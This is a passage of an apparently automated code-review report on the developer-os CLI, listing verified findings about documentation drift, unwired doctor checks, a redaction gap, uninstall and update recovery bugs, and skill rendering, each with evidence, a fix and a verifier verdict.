**Verifier (critic-only).** Not independently verified by a skeptic. The orchestrator checked: protected-paths.ts contains no toLowerCase/normalize call.

### DEAD-1 · docs-drift · doctor's per-artifact instruction renderer is never called; human output lacks the lines the architecture doc promises

`apps/cli/src/commands/doctor.ts:1865`

**Problem.** `describeInstructions` produces the `<owner> <category>/<id>: <source>, <state>` lines that foundation.md §12.6 says doctor's human output contains, but production never calls it. `renderDoctor` in main.ts prints only `report.checks`. The `instructions` check message is a count ("N instruction artifacts match their record" or "N instruction artifacts are drifted or missing"), so a user who runs `developer-os doctor` without --json is not told which artifacts drifted. The helper is reached only from doctor.test.ts and doctor-instructions.v2.test.ts, so those tests pin a format the CLI never prints. hooks.md:298 has the same shape: it cites `checkHooks` as the shipped doctor check, but `checkHooks` is also used only by tests, while production calls `hookFindings` directly (doctor.ts:858).

_Merged CLI-CMD-2 (apps/cli/src/commands/doctor.ts:1865): Doctor's per-artifact `instructions` lines are documented but never rendered; `describeInstructions` is dead._

**Evidence.**

```
`git grep -l -w describeInstructions` -> doctor.ts, doctor.test.ts, doctor-instructions.v2.test.ts only.
doctor.ts:1865 `export function describeInstructions(report: DoctorReportV1): readonly string[] { return report.instructions.map((status) => `${status.owner} ${status.category}/${status.id}: ${status.source}, ${status.state}`); }`
main.ts:516 `function renderDoctor(report: DoctorReportV1): readonly string[] { return report.checks.map((check) => `[${check.status}] ${check.id}: ${renderPath(check.message)}`); }`
foundation.md:1507-1508 "Human output is one `<owner> <category>/<id>: <source>, <state>` line per artifact."
doctor.ts:1503 pass message `${String(statuses.length)} instruction artifacts match their record`.
`git grep -l -w checkHooks` -> doctor.ts, doctor.test.ts, docs/architecture/hooks.md only.
```

**Fix.** Choose one. (a) Wire it: make renderDoctor append `describeInstructions(report)`, at least when the instructions check is not `pass`. (b) Drop the claim: delete `describeInstructions` with its test assertions and correct foundation.md §12.6. Separately, either delete the `checkHooks` wrapper and test `hookFindings` through `runDoctorReport`, or repoint hooks.md:298 at `hookFindings`.

**Validation.** With option (a), a main.test.ts case that runs `doctor` (no --json) on a home with one drifted artifact should show that artifact's line. Then run `npm run lint`.

**Verifier (confirmed).** Confirmed. Only doctor.ts, doctor.test.ts and doctor-instructions.v2.test.ts reference describeInstructions. main.ts:516 renderDoctor maps only report.checks to `[status] id: message`. The fail message at doctor.ts:1494 is a count (`N instruction artifacts are drifted or missing`) and renderDoctor does not print the check's paths. foundation.md:1507-1508 promises one `<owner> <category>/<id>: <source>, <state>` line per artifact. checkHooks (doctor.ts:865) is a test-only wrapper; production calls hookFindings at doctor.ts:1815, which is not line 858 as the finding says. hooks.md cites checkHooks as the shipped check. No BACKLOG row covers this. Medium holds because the human output never names which artifact drifted.

### FLOW-DOCS-1 · docs-drift · Codex/Claude adapter notes still say hooks are unshipped and pending Task 14/15

`docs/architecture/codex-adapter.md:208` · related: NEW-104

**Problem.** codex-adapter.md claims in six places that no Codex hook ships: line 11 says the Codex half is 'still pending', line 44 says 'It ships no hooks yet', line 117 says HOOK_EVENT_OF.codex is null, lines 208-214 say 'None of it is on Codex yet' (outcome map null, --vendor codex exits 0, doctor reports codex=not-rendered), the §9 table says 'not yet (plan Task 15)' at line 416, and line 449 says doctor 'emits no hook-trust advice'. claude-adapter.md:160 ('Not yet true. The render has no production caller until plan Task 14...') and vendor-invocation.md:425 ('The Codex half of the hook harness was not built') are equally stale. hooks.md §3.1 and the code say the opposite: Task 14 and Task 15 shipped, and the Codex isolated-ingest firing was observed (hooks.md §1 q9). Because the adapter notes are the per-vendor contracts that BACKLOG §8 indexes, a reader is told Codex hooks are inert when they are installed and fail closed.

**Evidence.**

```
Doc: codex-adapter.md:208-213 "**None of it is on Codex yet.** ... the Codex outcome map is `null`, and a `--vendor codex` hook invocation exits 0 ... `doctor`'s `hooks` check reports `codex=not-rendered`"; codex-adapter.md:117 "No Codex hook is rendered yet, and `HOOK_EVENT_OF.codex` is `null`"; claude-adapter.md:160 "**Not yet true.** The render has no production caller until plan Task 14 binds it". Code: apps/cli/src/instructions/attach.ts:504 `const tree = withClaudeHooks(renderClaudeVendorTree(...), input.hookExecutable);` and :554 `const tree = withCodexHooks(renderCodexVendorTree(...), input.hookExecutable);`; apps/cli/src/hooks/firing-records.ts:33 `codex: PASCAL_CASE_EVENTS,`; packages/adapter-codex/src/hooks.ts:43 `export const CODEX_HOOK_ROWS`; apps/cli/src/commands/doctor.ts:658 `export const CODEX_UNTRUSTED_HOOK_MESSAGE = "installed; not observed firing — approve it in Codex if you have not"`; apps/cli/src/instructions/apply.ts:459 `if (selection.includes("codex")) warnings.push(CODEX_HOOK_TRUST_STEP);`. `grep -rn "not-rendered" apps packages --include=*.ts` returns nothing.
```

**Fix.** Rewrite codex-adapter.md lines 11 and 44-49, §3 (117-118), §5 (208-223), the §9 table rows 416-417 and §10 (448-450) to describe the shipped state: CODEX_HOOK_ROWS and withCodexHooks in the install tree, PascalCase events, CODEX_HOOK_TRUST_STEP printed by init, and the doctor no-firing message. Replace claude-adapter.md:160-163 with a pointer to hooks.md §3.1/§4.1, and mark vendor-invocation.md §'The Codex half of the hook harness was not built' as superseded by hooks.md §1 q9.

**Validation.** After the edit, run `grep -n "not yet\|still pending\|None of it is on Codex\|Not yet true\|not-rendered" docs/architecture/codex-adapter.md docs/architecture/claude-adapter.md`; no hook-related hits should remain. Each remaining claim should resolve to attach.ts:504/554 and doctor.ts:658.

**Verifier (confirmed).** Verified verbatim. codex-adapter.md:11 says the Codex half 'is still pending', :44 says 'It ships no hooks yet', :117-118 says HOOK_EVENT_OF.codex is null, :208-214 says 'None of it is on Codex yet', the §9 table at :416 says 'not yet (plan Task 15)', and :449 says doctor 'emits no hook-trust advice'. claude-adapter.md:160 says 'Not yet true. The render has no production caller until plan Task 14', and vendor-invocation.md:425 says 'The Codex half of the hook harness was not built'. BACKLOG NEW-104 itself says 'Task 15 shipped the Codex hooks under D57', and the code wires withCodexHooks and withClaudeHooks in attach.ts. NEW-104 tracks only the real-agent observation, not this doc drift, so the finding adds new material. Severity stays medium because these per-vendor contract notes describe the opposite of what ships.

### FLOW-DOCS-2 · docs-drift · knowledge-pipeline §1/§2 still says no hooks ship, six keys are not-used, and all five contracts are 2.0.0

`docs/architecture/knowledge-pipeline.md:67`

**Problem.** §2 says hooks are 'declined, not deferred' (line 47) and 'no hooks ship, in either vendor tree, in v1' (line 67). Lines 76-79 say plugin_hooks and session_start_injection resolve to `not-used` before any observation. A13 reversed all three: eight hook verbs ship on both vendors, and both keys left the NOT_USED lists and resolve from firing records. hooks.md §3.6 points readers to 'knowledge-pipeline.md §2' as the authority that capture stays declined, so the stale text sits on a live contract path. §1 line 30 also says capture/review/ingest/brain-search/shared are 'all five at 2.0.0', but review is 2.1.0.

**Evidence.**

```
Doc: knowledge-pipeline.md:67 "- no hooks ship, in either vendor tree, in v1;"; :76-79 "`plugin_hooks`, `session_start_injection`, `session_end_capture`, `pre_compact_backup`, `subagents` and `durable_project_guidance` resolve to **`not-used` before the version table or any observation is consulted**"; :30 "all five at `2.0.0`". Code: packages/adapter-claude/src/capabilities.ts:32-37 `export const CLAUDE_NOT_USED_KEYS ... = ["session_end_capture", "pre_compact_backup", "subagents", "durable_project_guidance"];`; packages/adapter-claude/src/hooks.ts:20-27 (eight CLAUDE_HOOK_ROWS); workflows/review/workflow.yaml:3 `version: 2.1.0`.
```

**Fix.** Amend knowledge-pipeline §2 with a dated A13 note. Only the two capture hooks (session_end_capture, pre_compact_backup) remain declined, and the eight non-capture verbs ship (hooks.md §3). The not-used list is the four keys in CLAUDE_NOT_USED_KEYS/CODEX_NOT_USED_KEYS. In §1, state review at 2.1.0.

**Validation.** Compare the §2 key list with CLAUDE_NOT_USED_KEYS and CODEX_NOT_USED_KEYS, and the §1 version claims with `grep -n '^version:' workflows/*/workflow.yaml`.

**Verifier (confirmed).** Verified. knowledge-pipeline.md:67 says 'no hooks ship, in either vendor tree, in v1', and :76-79 lists six keys, including plugin_hooks and session_start_injection, as resolving to not-used. CLAUDE_NOT_USED_KEYS in packages/adapter-claude/src/capabilities.ts:32-37 holds only four keys. :30 says the five contracts are 'all five at 2.0.0', but workflows/review/workflow.yaml is at 2.1.0. The note has no A13 amendment (a grep for A13/Amended finds none in §1-§2), and hooks.md:494 still cites knowledge-pipeline §2 as the authority. The backlog notes only that §§1,3,5,7 'were not reviewed', which does not track these contradictions.

### FLOW-INIT-1 · flow · Firing records never reach the plugin_hooks / session_start_injection capability matrix

`apps/cli/src/commands/doctor.ts:585` · related: NEW-127, NEW-139

**Problem.** readHookFiringObservations() builds an `observations` map (plugin_hooks / session_start_injection = observed). reportClaudeCapabilities and reportCodexCapabilities accept it as `firingObservations`, and that parameter is documented as 'the only source for those two keys'. No production caller ever passes it. doctor's checkClaudeCapabilities and checkCodexCapabilities call the reporters without it, and checkProductHooks reads only `records` and `recordFailed`. With an empty map, resolveCapabilities returns `unknown` for both keys. So `doctor` always prints plugin_hooks=unknown session_start_injection=unknown, even when its own `hooks` check lists fresh records for every verb. hooks.md §3.6 claims these keys resolve from records 'in both the probed and the unprobed doctor run'. The capability tests feed the map directly, so the gap is invisible to tests.

**Evidence.**

```
doctor.ts:585 `const report = await reportClaudeCapabilities({ ...capabilityInput(outcome), runner: context.runner, probe, pluginDirectory: ... });` (no firingObservations); doctor.ts:637 is the same for Codex. doctor.ts:766 `const { records, recordFailed } = await readHookFiringObservations(stateDirectory, vendor);` (`observations` is dropped). `grep -rn firingObservations apps packages --include=*.ts | grep -v dist` finds only the two interface fields (claude-capabilities.ts:52, codex-capabilities.ts:51), their reads (:202, :173) and *.test.ts files. `git log -S firingObservations -- apps/cli/src/commands/doctor.ts` is empty, so it was never wired. hooks.md:491-492: 'plugin_hooks resolves from any firing record for the vendor, and session_start_injection from that vendor's inject record, in both the probed and the unprobed doctor run.'
```

**Fix.** In checkClaudeCapabilities and checkCodexCapabilities, call `readHookFiringObservations(context.paths.stateDir, vendor)` and pass `firingObservations: observations`. Alternatively, read it once in the doctor run and share it with checkProductHooks.

**Validation.** Add a doctor.test.ts case that writes a valid `claude.inject.json` record and a fixture Claude version at or above the 2.1.280 floor, then asserts the `claude-capabilities` message contains `plugin_hooks=yes session_start_injection=yes`. Do the same for Codex.

**Verifier (confirmed).** Verified. doctor.ts:585 and :637 call reportClaudeCapabilities and reportCodexCapabilities without firingObservations. The only production caller of readHookFiringObservations is doctor.ts:766, and it reads only records and recordFailed. claude-capabilities.ts:202-210 then resolves plugin_hooks and session_start_injection from an empty map, so both always come out unknown. hooks.md:490-492 says these keys resolve from records 'in both the probed and the unprobed doctor run'. NEW-104 and NEW-127 expect real-session doctor output to show plugin_hooks=yes, which this wiring gap makes impossible. No doctor test asserts plugin_hooks, and nothing in BACKLOG tracks the missing wiring.

### FLOW-INIT-4 · security · SessionStart injection redacts vault text with built-in classes only, skipping the user's redaction patterns

`apps/cli/src/hooks/inject.ts:52`

**Problem.** inject sends vault-map.md and the project note's full text to the vendor session. It redacts them with `context.guards.redactDiagnostic`, which createGuards builds from `createRedactor(redactionKey)` with no userPatterns. The comment in context.ts says each command rebinds its guards with a config-bound redactor once it has the config. inject reads the config at line 45 and never rebinds. readConfigFile's bindRedactionPatterns updates only the runner's redactor, not guards. Every other path that sends vault or capture text to a vendor uses the user's patterns: capture, review, ingest and garden (NEW-16). A hand-written project note matching a user-configured pattern (an internal hostname or customer id) is injected verbatim into every session of that project.

**Evidence.**

```
inject.ts:45 `const config = await readConfigFile(context, context.paths.configFile);`; inject.ts:52 `: { kind: "context", text, redact: context.guards.redactDiagnostic };`. context.ts createGuards: `/** Built-in classes only, for the reason `createTransactionGuards` states. */ const redact = createRedactor(redactionKey);`. context.ts createTransactionGuards: 'Each command rebinds its own guards with a config-bound redactor as soon as it has both — see `guardsWith` in `capture.ts`, `review.ts` and `ingest.ts`.' Compare ingest.ts:2413, review.ts:712 and garden.ts:212, which use `createRedactor(key, { userPatterns: config.redaction?.patterns ?? [] })`.
```

**Fix.** In inject(), once config is read, build `createRedactor(readRedactionKey(paths.stateDir) ?? randomBytes(32), { userPatterns: config.redaction?.patterns ?? [] })`, the same way project-check.ts:115 and git/service.ts:494 do, and pass its `.text` as the outcome's redact.

**Validation.** In an inject.test.ts case, set config `[redaction] patterns = ["ACME-[0-9]+"]`, put a project note containing `ACME-1234`, and assert that the stdout context does not contain `ACME-1234`.

**Verifier (confirmed).** Verified. inject.ts:45 reads the config and inject.ts:52 still passes context.guards.redactDiagnostic, which context.ts:434 builds as createRedactor(redactionKey) with no userPatterns. context.ts:421-422 says each command must rebind its guards with a config-bound redactor once it has the config, and inject does not. bindRedactionPatterns (config-file.ts:62) updates only the runner's redactor. hooks.md:334 says only that context text 'passes through the redactor' and does not document built-in-only redaction as a decision. User-configured patterns in hand-written vault or project notes therefore reach the vendor session unredacted. No BACKLOG row covers this.

### FLOW-UNINST-1 · flow · doctor cannot see an interrupted V2 uninstall, yet every lifecycle refusal sends the user to doctor

`apps/cli/src/commands/doctor.ts:1034` · related: NEW-100

**Problem.** An interrupted coordinator uninstall leaves three things behind: a coordinator journal under state/lifecycle-journals, Foundation participant journals under state/transactions, and a non-empty state/uninstalling.json marker. doctor reads none of the lifecycle ledger. Its `transactions` check lists every state/transactions/*.json, coordinator-owned participants included, and recommends `developer-os repair --resume|--rollback <id>`. The gated executor refuses that repair while any coordinator exists (`snapshot.coordinators.length === 0` in requireResolvedClosure), and the refusal names `developer-os doctor` as its recovery. That is a closed loop. Once the cursor passes M(commit_absence), the manifest and config are gone, so doctor's `manifest` and `configuration` checks recommend `developer-os init`. Fresh init then meets the coordinator journal inside the bookkeeping set and throws FreshBootstrapError('bookkeeping residue of an unadmitted shape') with no recovery text. The only working remedy is re-running `developer-os uninstall` (the recovery-only arm in dispatchUninstall/resumeUninstall), and no surface names it. A scheduled runner that sees the non-empty marker also refuses indefinitely, and doctor does not report that either.

**Evidence.**

```
doctor.ts:265 `const journalDir = join(context.paths.stateDir, "transactions");` (the only journal root doctor reads); doctor.ts:1043 recovery `developer-os repair --resume ${first.id} | developer-os repair --rollback ${first.id}`; mutation-gate.ts:449-458 `snapshot.coordinators.length === 0 && ... if (sole) return; throw new LifecycleMutationRefusal({ reason: "lifecycle_closure_unresolved", ... recovery: "developer-os doctor" })`; doctor.ts:995-1001 manifest absent -> `fail("manifest", "no installation manifest exists", ..., "developer-os init")`; executor.ts:1369-1372 `throw new FreshBootstrapError(EXIT_CODES.recoveryRequired, `product home contains bookkeeping residue of an unadmitted shape: ...`)` (init.ts:1131 passes recovery only for InitRefusal); core/lifecycle/foundation-ledger.ts:123 `foundationJournals: at("state/transactions")` (coordinator participants share doctor's survey root); `rg -n -i "closure|ledger|coordinator|uninstalling" apps/cli/src/commands/doctor.ts` returns no lifecycle-ledger read. Refusals that name doctor: uninstall.ts:1594, uninstall-recovery.ts:72, core/lifecycle/recovery.ts:239, mutation-gate.ts:460/482/525/580, update/context.ts:229.
```

**Fix.** Add one guarded doctor check, e.g. `lifecycle`, that runs lifecycle.inspectLedger (read-only) and observes uninstallingMarkerPresent. On an uninstall coordinator or a non-empty marker it should fail with recovery `developer-os uninstall`. The `transactions` survey should skip journals whose ids belong to a coordinator, so it stops recommending a repair the gate refuses. FreshBootstrapError for a coordinator journal under the bookkeeping set should carry recovery `developer-os uninstall`.

**Validation.** In a fixture, kill a V2 uninstall after commit_absence (the existing A9 kill points) and run doctor. Today it reports manifest/configuration -> `init` (or transactions -> `repair`). After the fix it should report the lifecycle check with recovery `developer-os uninstall`, and following that recovery should reach a clean home.

**Verifier (downgraded).** Confirmed in code. doctor.ts:265 reads only state/transactions. `rg closure|ledger|coordinator|uninstalling` finds no lifecycle-ledger or marker read in doctor.ts. checkTransactions (doctor.ts:1034-1045) recommends `repair --resume|--rollback`. mutation-gate.ts:449-462 refuses while any coordinator exists, with recovery `developer-os doctor`. lifecycle/uninstall.ts:1590-1595 also points to `developer-os doctor`. foundation-ledger.ts:123 puts Foundation participant journals in the same state/transactions root. The only recovery that works is re-running uninstall (resumeUninstall, recover with resumeUninstall:true), and doctor never names it. NEW-100 covers only the missing round-trip test, so this gap is untracked. I lowered the severity to medium: the loop needs an interrupted uninstall (a crash or kill), and re-running the same command recovers, so no data is at risk.

### FLOW-UNINST-2 · logic · `uninstall --yes` detaches vendor instructions and unregisters Codex before the checks that can refuse the uninstall

`apps/cli/src/commands/uninstall.ts:782`

**Problem.** runCoordinatorUninstall runs uninstaller.preview, the step that calls planUninstall and refuses on Foundation drift (exit 3), only when `options.dryRun || !options.assumeYes`. With `--yes` it goes straight to detachVendorInstructions, which unregisters the Codex plugin through the codex CLI and commits an `instructions` transaction that deletes every Claude/Codex row. Only after that does uninstaller.execute -> preview run the drift refusal, the capacity refusal (uninstall_artifact_capacity_exceeded), the launchd host admission (unsupported_launchd_distribution) and the hook-records/codex-ingest-home shape refusals. Any of them leaves a half-uninstalled home: vendor instructions gone and Codex unregistered, Foundation, config and launchd jobs intact, and the command exits non-zero. The interactive path refuses the same home before touching anything, so the outcome depends on `--yes`. The doc comment `foundation.md` §12.4 ('the dry run and the prompt preview the coordinator over the manifest the detach would leave') covers only the non-`--yes` path.

**Evidence.**

```
uninstall.ts:745 `if (options.dryRun || !options.assumeYes) { ... preview = await uninstaller.preview(...) ... }`; uninstall.ts:782-783 `if (detach === null) return success(await uninstaller.execute(request(admitted)));
  const detached = await detachVendorInstructions(context, lifecycle);`; lifecycle/uninstall.ts:1964 `const { warning } = await unregisterCodexPlugin({...})` and :1974 `await context.executor.execute({ kind: "instructions", mutations: plan.mutations });`; lifecycle/uninstall.ts:1598 `const preview = await this.preview(request, current());` (inside execute, after the detach); commands/uninstall.ts:418-424 `if (edited.length > 0) { throw new UninstallRefusal(EXIT_CODES.decisionRequired, "managed artifacts were modified after installation; ..."`. `rg -n "uninstall" apps/cli/src/commands/init-instructions.v2.test.ts` shows only the happy-path detach tests (lines 409, 492); no test covers --yes with drift.
```

**Fix.** In runCoordinatorUninstall, always run the preview over the post-detach manifest (the existing `detached.manifest` branch) under the held lock before calling detachVendorInstructions, whatever `assumeYes` is. Keep the `--yes` skip only for the confirm prompt.

**Validation.** Add a test: a V2 home with Claude rows and one edited Foundation artifact, runUninstall({dryRun:false, assumeYes:true}). Expect exit 3 and an unchanged inventory, with Claude files and the Codex registration still present. Today the vendor files are gone.

**Verifier (downgraded).** Confirmed, but the cited line numbers are off (the detach is at uninstall.ts:811-812, not 782-783). The preview runs only when `options.dryRun || !options.assumeYes` (line 777). With --yes, detachVendorInstructions (unregisterCodexPlugin plus a committed `instructions` transaction) runs first. LifecycleUninstaller.preview, which calls planUninstall (drift refusal exit 3 at commands/uninstall.ts:436-442), deriveVariant and the launchd plan, runs only inside execute (lifecycle/uninstall.ts:1598), after the detach. So the outcome of --yes differs from the interactive path, and a refused run leaves the vendor files detached. I lowered the severity to medium: only product-owned vendor rows are removed, in a committed and consistent transaction, so no user data is lost, and re-attaching restores them.

### FLOW-UPD-2 · logic · Recovery resumes a coordinator of the other operation, so `update --apply` can finish a rollback and then re-apply the release that was just rolled back

`apps/cli/src/update/apply.ts:137`

**Problem.** Spec 2 §9.2 says only the exact recorded update operation may resume an `update_recovery` arm. The mutation gate follows this and names the matching command. But recoverLocked/routeUpdateRecovery never read `closure.operation`, and runApply and runRollbackApply both call recoverUpdate first. Concrete case: `update rollback --apply` (B to A) is killed while moving forward. The user runs `update --apply`, which finalizes the rollback to A. resumedRollback returns null for a finalized outcome, so runApply goes on to prepareUpdate and applyUpdate, which puts B back and reports `applied`. The rollback is silently undone. The reverse also happens: `update rollback --apply` finishes an interrupted apply and then rolls it back. A compensated cross-operation resume is also reported with the wrong kind (`update_rolled_back_automatically` for a rollback coordinator).

**Evidence.**

```
docs/superpowers/specs/2026-08-28-developer-os-release-update-design.md:4792-4793 "Only the exact recorded update operation, under the global lock and without a new network/planner attempt, may resume it."
apps/cli/src/lifecycle/mutation-gate.ts:497 `recovery: operation === "update_rollback" ? "developer-os update rollback --apply" : "developer-os update --apply",`
apps/cli/src/update/apply.ts:137-143 `async function recoverLocked(ports, closure) { return routeUpdateRecovery(closure, { coordinator: { recover: (id) => new UpdateLifecycleCoordinator(ports.coordinator(id)).recover(id) }, ...` (no operation check)
apps/cli/src/commands/update/index.ts:95-98 `const resumed = await resumedRollback(...); if (resumed !== null) return resumed; const prepared = await prepareUpdate(update, { version });`
No test in apps/cli/src/update/apply.test.ts, rollback-apply.test.ts or tests/integration/update/recovery.test.ts resumes a coordinator whose operation differs from the invoking command (rollback-apply.test.ts:253 uses only `operation: "update_rollback"`).
```

**Fix.** Pass the invoking operation into recoverUpdate. When an `update_recovery` arm (or a construction cleanup with a known operation) names a different operation, refuse with exit 6 and give the recovery command the mutation gate already uses. Also stop after any resumed coordinator, finalized or not, instead of starting a new plan in the same invocation.

**Validation.** Unit test: closure `{kind:'update_recovery', operation:'update_rollback'}` passed to runUpdate({kind:'update', apply:true}) must refuse naming `developer-os update rollback --apply` and must not call prepareUpdate. Add the symmetric test for rollback.

**Verifier (downgraded).** Confirmed that apply.ts:137-143 (recoverLocked) and recovery.ts:254-275 (routeUpdateRecovery) never read closure.operation. The spec (release-update-design.md:4792-4793) says only the exact recorded operation may resume. The mutation gate (mutation-gate.ts:488-497) does distinguish the operation. runApply and runRollbackApply both call resumedRollback/recoverUpdate first, and they go on unless the outcome is rolled_back. No test covers a resume across operations. I downgraded it because the follow-on action is the one the user explicitly asked for in that same invocation: `update --apply` applies the latest release, and `rollback --apply` rolls back. Nothing is 'silently undone' against the user's request. The real defects are the spec deviation and the wrong result kind.

### FLOW-UPD-3 · flow · No update or rollback ever rewrites the version-free entrypoint, so it keeps loading the init-time release until that release is retired

`apps/cli/src/update/entrypoint.ts:30` · related: NEW-111

**Problem.** D53 says `<product-home>/bin/developer-os.mjs` 'loads the active release'. Every hook and every founder command runs it. renderEntrypoint hardcodes the active bundleRoot at write time, and only `init` calls installEntrypoint. The update owner registry treats `core` rows as keep-only, and the entrypoint is a `core`-owned row, so no update plan can change it by design. After `update --apply` from A to B, hooks and `dos` still run A's CLI against a home whose active release is B. After a second update (B to C), the `prior_rollback` retirement deletes A's bundle (compose.ts #retirementEntries). The entrypoint's import then fails, and the guard hooks exit 2 ('active release could not be loaded'), which blocks every guarded vendor tool call. doctor's checkEntrypoint only reports presence, so this goes unnoticed. A second problem: renderEntrypoint uses the fixed LOCAL_BUNDLE_CLI_ENTRY, while the launcher resolves `manifest.entrypoint` of the admitted bundle. These are two sources for one concept. This is latent until Task 11b, because apply refuses `update_fallback_unavailable` in production today.

**Evidence.**

```
apps/cli/src/update/entrypoint.ts:31 `const target = pathToFileURL(join(bundleRoot, LOCAL_BUNDLE_CLI_ENTRY)).href;`
entrypoint.ts:132 `owner: "core" as const,`; apps/cli/src/update/context.ts:246 `keepOwnerUpdateProvider("core"),`
`git grep -n installEntrypoint` -> only apps/cli/src/commands/init.ts:354,979; `grep -rn 'developer-os.mjs\|ENTRYPOINT_DIRECTORY' apps/cli/src/update packages/core/src/update` -> only entrypoint.ts/local-release.ts.
Roadmap D53: "`init` writes one product-owned, version-free entrypoint `<product-home>/bin/developer-os.mjs` that loads the active release."
tests/e2e/release-update.test.ts runs apply, a second apply that retires, rollback and reapply, but never asserts the entrypoint's content.
```

**Fix.** Make the entrypoint follow active-release.json. Option A: a core owner provider that re-renders the `bin/developer-os.mjs` row for the target bundleRoot inside the update and rollback owner plans. Option B: have renderEntrypoint read state/active-release.json at run time and import `<bundleRoot>/<manifest.entrypoint>`, so the file never changes. Either way, derive the CLI path from the bundle manifest's `entrypoint`, not LOCAL_BUNDLE_CLI_ENTRY.

**Validation.** Extend tests/e2e/release-update.test.ts: after each apply and rollback, the import target in bin/developer-os.mjs must equal the active record's bundleRoot, and after the second apply the referenced bundle must exist.

**Verifier (downgraded).** The code facts check out. renderEntrypoint (entrypoint.ts:30-31) hardcodes the bundleRoot plus LOCAL_BUNDLE_CLI_ENTRY. installEntrypoint is called only from init.ts:354 and 979. The CURRENT_OWNER_REGISTRY keeps core as keep-only (context.ts:245-246). The claim that no update plan can change the file 'by design' is overstated, though. That registry is only the current side ('keep-only on the current side'). Target owner plans come from the target release's planner, and planner.ts parseOwnerPlan (605-630) accepts core-owner operations, so a future target planner (Task 11b, NEW-111, not built yet) could rewrite the row. Production apply refuses update_fallback_unavailable today. This is a real latent gap with no current mechanism or spec text that guarantees the rewrite, but it is not reachable now.

### RENDER-1 · logic · Thin commands replace the real description of five skills in the agent's listing

`packages/adapter-claude/src/instructions.ts:114`

**Problem.** For each catalog row with thinCommand: true (analizer, fix-pr, implementator, przeglad-claudemd, spec), the Claude renderer writes commands/<id>.md under the same plugin-qualified name as skills/<id>/SKILL.md. Both register as developer-os:<id>. In a real session the model then sees the command's generic description, 'Invoke the developer-os:<id> skill', instead of the skill's 'Use when …' description. With no trigger text the model cannot auto-select these five skills. The commands also add nothing: the skills already carry argument-hint and can be called with a slash.

**Evidence.**

```
packages/adapter-claude/src/instructions.ts:114-122:
function thinCommand(id: string): string {
  return ["---", `description: ${JSON.stringify(`Invoke the developer-os:${id} skill`)}`, "---", "", `Invoke the \`developer-os:${id}\` skill with these arguments: $ARGUMENTS`, ""].join("\n");
}
line 170: if (artifact.thinCommand) pluginFiles.push({ path: `commands/${id}.md`, contents: thinCommand(id) });
catalog.json: analizer/fix-pr/implementator/przeglad-claudemd/spec have "thinCommand":true.
The skill listing of this live Claude Code session (installed tree = repo render; `diff -rq ~/.claude/skills/developer-os plugins/claude` shows only hooks/ and user-override skills) shows: 'developer-os:analizer: Invoke the developer-os:analizer skill', 'developer-os:spec: Invoke the developer-os:spec skill', and the same for fix-pr, implementator and przeglad-claudemd. Non-thin skills show their real description (e.g. developer-os:developer-os-brain-compile: 'Synthesise one compiled note …'). The real description (instructions/skills/analizer/SKILL.md:3, 'Orchestrate parallel specialist analysis … Use when the user invokes analizer …') never reaches the model. No doc in docs/architecture records a purpose for thinCommand (grep 'thin command|thinCommand' docs/architecture: no hits).
```

**Fix.** Set thinCommand: false on the five catalog rows and re-render with npm run render:claude. The skills keep their argument-hint and stay invocable as /developer-os:<id>. If a command form is still wanted, give it a different name from the skill, or copy the skill's description into the command frontmatter. Do not use the generic 'Invoke …' string.

**Validation.** Re-render, then run tests/contracts/adapters/claude/generated.test.ts (drift and set equality). Reinstall and confirm that the session skill listing shows the 'Use when …' description for developer-os:analizer and developer-os:spec.

**Verifier (downgraded).** The code is as quoted (instructions.ts:114-122, :170), and the five catalog rows have thinCommand:true. This session's own skill listing shows 'developer-os:analizer: Invoke the developer-os:analizer skill' and the same text for fix-pr, implementator, przeglad-claudemd and spec. So the generic description does replace the 'Use when' text. The finding says no doc records a purpose for thin commands; that is false. docs/migration/instruction-inventory.md:45 records the decision: 'the product ships one skill plus a thin command'. foundation.md:1381-1388 and sources.ts:330 also document thinCommand. The bug is real: the thin command's description shadows the skill's. Downgraded to medium because the thin command was a deliberate design choice, and these five are mostly invoked explicitly by the user, so missed auto-selection costs less.

### RENDER-2 · flow · The review contract has no id input, so its decide/edit steps document a call the CLI always refuses

`workflows/review/workflow.yaml:7`

**Problem.** The review workflow declares only the inputs status and decision. Its decide step renders as `developer-os review` with {"decision":"$input.decision"}, and its edit step as bare `developer-os review`. The CLI refuses --decision without --id with exit 2 (resolveTarget). So in both vendors' rendered developer-os-review skill, the only call the skill documents for a decision cannot succeed. The cause is systemic: skill.ts emits a step's `with` as a raw JSON object and never maps keys to argv. brain.search's `query` is a positional argument (main.ts:668) but renders as {"query":…}, and that only works if the agent guesses right. For review, guessing cannot fix it, because the contract never collects the capture id.

**Evidence.**

```
workflows/review/workflow.yaml inputs: only `status:` and `decision:`; steps: `- id: decide\n    do: capture.setStatus\n    with:\n      decision: $input.decision` and `- id: edit\n    do: capture.edit`.
apps/cli/src/commands/review.ts resolveTarget: `if (id === undefined) { throw new ReviewRefusal(EXIT_CODES.invalidInput, "--decision applies to one capture; pass --id to name it. …") }`
packages/workflow-schema/src/skill.ts:360-366: `if (step.with !== undefined) { const json = JSON.stringify(step.with); … lines.push(...fenced(screen(json), "json"), ""); }`
Rendered plugins/claude/skills/developer-os-review/SKILL.md (and the codex copy): '### decide … developer-os review … {"decision":"$input.decision"}'.
apps/cli/src/main.ts:668: `query: alias ? (first ?? null) : subcommand === "search" ? (second ?? null) : null` (query is positional, not a --query flag).
```

**Fix.** Add a required-with-decision `id` input to workflows/review/workflow.yaml (16 lowercase hex, the capture file name) and pass it on the decide and edit steps (with: { id: $input.id, decision: $input.decision }). Bump the workflow version and re-render both vendors. Longer term, have the vocabulary entry declare an argv template (positional versus --flag per key), so skill.ts renders an exact command line instead of JSON.

**Validation.** Re-render, then run the codex and claude generated.test.ts drift tests. Add a contract test asserting that every `with` key of every step maps to a flag or positional the CLI parser accepts for that verb (review: id, decision, status; brain search: positional query, --limit; capture: --text).

**Verifier (confirmed).** Verified. workflows/review/workflow.yaml declares only the inputs status and decision. The decide step's `with` is {decision:$input.decision}, and the edit step has no `with`. The rendered SKILL.md shows bare `developer-os review` plus {"decision":"$input.decision"}, and nothing anywhere in it mentions --id. review.ts:185 refuses --decision without --id. skill.ts:360-366 prints `with` as raw JSON. No BACKLOG row covers this.

### W2-BOOT-B-2 · logic · Compensation from payloadWriteState=create_intent is unhandled although the core grammar defines it

`apps/cli/src/bootstrap/executor.ts:3723`

